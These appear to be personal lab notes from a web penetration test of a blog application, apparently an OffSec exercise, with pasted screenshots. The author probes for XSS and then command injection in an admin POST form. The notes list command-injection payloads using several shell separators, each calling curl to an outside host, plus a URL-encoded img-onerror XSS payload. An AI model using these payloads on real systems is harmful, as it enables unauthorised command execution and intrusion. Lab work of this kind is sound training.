starting page
![[Pasted image 20250106175618.png]]
sending a `test` post
![[Pasted image 20250106175651.png]]
can see it placed at `/blog.php`

![[Pasted image 20250106175720.png]]
next `checking both boxes` and testing `xss` with simple payload `<h1>offsec</h1>` - also note it shows where are posts are placed
![[Pasted image 20250106175941.png]]the `POST` that followed 
- has fields to check for `command injection`
![[Pasted image 20250106180043.png]]
at `/blog.php` looks like the `test` may have processed just not fully, going to try another payload to ensure `XSS` isnt vulnerable
![[Pasted image 20250106180147.png]]
dont think `xss` is the way forward
![[Pasted image 20250106180331.png]]
going to test `LCE` `RCE` `Command Injection` by sending the `/admin/index.php` POST to repeater - starting first by appending to the original place holder for both variables
`$(curl http://192.168.49.61:8000/test.txt)`
```bash
||curl http://192.168.49.61:8000/test.txt
;curl http://192.168.49.61:8000/test.txt
|curl http://192.168.49.61:8000/test.txt
&&curl http://192.168.49.61:8000/test.txt
`curl http://192.168.49.61:8000/test.txt`
$(curl http://192.168.49.61:8000/test.txt)
```


```bash
%3Cimg+src%3D%27x%27+onerror%3D%27alert%281%29%27%3E
```